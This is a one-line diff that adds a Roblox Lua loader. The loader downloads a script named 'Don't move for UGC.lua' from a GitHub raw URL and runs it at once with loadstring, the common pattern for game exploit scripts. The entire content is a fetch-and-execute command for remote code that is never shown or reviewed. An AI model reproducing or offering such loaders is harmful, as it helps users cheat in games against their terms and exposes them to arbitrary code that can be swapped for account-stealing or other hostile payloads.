@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Imalwibest/Imalwibest/main/Don't%20move%20for%20UGC.lua"))()
